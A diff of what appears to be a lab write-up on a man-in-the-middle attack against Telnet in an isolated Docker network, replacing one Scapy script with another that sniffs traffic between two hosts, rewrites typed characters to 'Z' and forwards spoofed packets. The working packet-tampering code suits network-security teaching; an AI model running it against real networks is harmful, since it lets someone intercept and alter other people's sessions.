@@ -133,45 +133,66 @@ Additionally, the code prints "Nigel is launching an MitM Attack on Telnet" to t
 ```
 #!/usr/bin/env python3
 from scapy.all import *
-import re
 
-print("Nigel is launching an MitM Attack on Telnet")
+print ("Nigel is injecting Z's")
 
-# Set the target IP addresses
-target_a_ip = '10.9.0.5'
-target_b_ip = '10.9.0.6'
+IP_A = "10.9.0.5"
+MAC_A = "02:42:0a:09:00:05"
+IP_B = "10.9.0.6"
+MAC_B = "02:42:0a:09:00:06"
+IP_M = "10.9.0.7"
+MAC_M = "02:42:0a:09:00:07"
 
-# Set the MAC addresses for Hosts A, B, and M
-host_a_mac = '02:42:0a:09:00:05'
-host_b_mac = '02:42:0a:09:00:06'
-host_m_mac = '02:42:0a:09:00:69'
+def spoof_pkt(pkt):
+    if pkt[IP].src == IP_A and pkt[IP].dst == IP_B:
+        # Create a new packet based on the captured one.
+        # 1) We need to delete the checksum in the IP & TCP headers,
+        # because our modification will make them invalid.
+        # Scapy will recalculate them if these fields are missing.
+        # 2) We also delete the original TCP payload.
+        newpkt = IP(bytes(pkt[IP]))
+        del(newpkt.chksum)
+        del(newpkt[TCP].payload)
+        del(newpkt[TCP].chksum)
 
-# Define the Telnet data modification function
-def modify_telnet_data(pkt):
-    if IP in pkt and TCP in pkt and pkt[IP].src == target_a_ip and pkt[IP].dst == target_b_ip and pkt[TCP].payload:
-        # Extract the Telnet data from the TCP packet
-        telnet_data = pkt[TCP].payload.load.decode(errors='ignore')
+        # Construct the new payload based on the old payload.
+        if pkt[TCP].payload:
+            data = pkt[TCP].payload.load # The original payload data
+            newdata = b'Z' * len(data) # Replace each character with 'Z'
+            send(newpkt/newdata, iface='eth0', verbose=0, loop=0, count=1, 
+                 inter=0, timeout=None, realtime=False) # Send the spoofed packet to Host B
+        else:
+            send(newpkt, iface='eth0', verbose=0, loop=0, count=1, 
+                 inter=0, timeout=None, realtime=False)
 
-        # Replace each character in the Telnet data with the fixed character (Z in this case)
-        # The standard library ‘re’ module provides regular expression matching operations
-        telnet_data = re.sub('.', 'Z', telnet_data)
+    elif pkt[IP].src == IP_B and pkt[IP].dst == IP_A:
+        # Create new packet based on the captured one
+        # Do not make any change
+        newpkt = IP(bytes(pkt[IP]))
+        del(newpkt.chksum)
+        del(newpkt[TCP].chksum)
 
-        # Recalculate the TCP checksum and update the packet
-        del pkt[IP].chksum
-        del pkt[TCP].chksum
-        pkt[TCP].payload = telnet_data.encode()
-        pkt[TCP].len = len(pkt[TCP].payload)
+        send(newpkt, iface='eth0', verbose=0, loop=0, count=1, 
+             inter=0, timeout=None, realtime=False) # Send the packet to Host A
 
-        # Send the modified packet to Host B
-        sendp(pkt, iface='eth0')
+    elif pkt[IP].src == IP_A and pkt[IP].dst == IP_M:
+        # Create a new packet based on the captured one.
+        # Modify the destination IP and MAC addresses to spoof the packet.
+        newpkt = IP(bytes(pkt[IP]))
+        newpkt.dst = IP_B
+        del(newpkt.chksum)
 
-# Set up a packet capture filter to capture only Telnet traffic from Host A to Host B
-filter_str = 'tcp and src host {} and dst host {} and dst port 23'.format(target_a_ip, target_b_ip)
+        ethpkt = Ether(dst=MAC_B, src=MAC_M)
+        ethpkt.payload = newpkt
+        del(ethpkt.chksum)
 
-# Start the packet capture and modification loop
-sniff(prn=modify_telnet_data, filter=filter_str, store=0)
+        sendp(ethpkt, iface='eth0', verbose=0, loop=0, count=1, 
+              inter=0, timeout=None, realtime=False) # Send the spoofed packet to Host B
+
+f = 'tcp and host 10.9.0.5 and host 10.9.0.6'
+pkt = sniff(iface='eth0', filter=f, prn=spoof_pkt) # Sniff the traffic between Host A and Host B
 ```
 
-This updated script should prevent any ```AttributeError: 'bytes' object has no attribute '__iterlen__'``` error from occurring. </br>
-However, it may not prevent other errors or issues that may arise from running the script. I will continue testing further.
+This script replaces each typed character in Telnet with the character 'Z', and also allows for redirecting the TCP packets to a spoofed address. Note that I added a new variable ```IP_M``` for the spoofed IP address and ```MAC_M``` for the spoofed MAC address, and modified the ```spoof_pkt()``` function to create and send the spoofed packets.
+
 
